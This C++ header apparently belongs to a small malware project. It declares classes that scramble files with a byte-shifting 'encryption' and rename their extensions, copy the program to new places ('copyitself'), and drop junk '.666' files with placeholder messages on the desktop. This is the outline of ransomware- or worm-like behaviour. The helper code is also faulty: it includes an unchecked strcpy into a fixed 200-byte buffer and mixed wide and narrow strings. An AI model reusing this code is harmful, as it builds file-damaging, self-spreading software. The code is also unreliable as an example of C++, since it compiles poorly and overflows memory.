#pragma once
#ifndef FILES_H
#define FILES_H

namespace crypt
{
	class Encryption
	{

	private:

		std::fstream fps, fpt;

	public:
		char character;
		std::wstring suffix;
		void encrypt(std::string path);

		char _Tfilenc()
		{
			for(int g = 0; g < 3; g++)
			{
				character = character + 100;
			}
			return character;
		}

		char _Tfiledec()
		{
			for (int g = 0; g < 3; g++)
			{
				character = character - 100;
			}
			return character;
		}


		std::string rename_suffix(std::string str)
		{
			int32 i, j;
			char aux[200];

			strcpy(aux, str.c_str());
			for (i = 0; i < strlen(aux); i++)
				if (aux[i] == '.')
					break;

			for (j = 0; j < size(suffix); j++)
				aux[i + j + 1] = suffix[j];
			aux[i + j + 1] = '\0';

			return aux;
		}

	};

	class Replication
	{
	public:
		int copyitself(void);
	};
	class Spam
	{
	private:
		std::wstring fname = L"♥日本人◊中國的♥ 𓀐𓂸";
		std::wstring ftype = L".666";
		const char* fcontent = R"fcontent(
CUSTOM MSG
ANOTHER
LOL
...
)fcontent";

	public:

		void desktop();
	};
};
#endif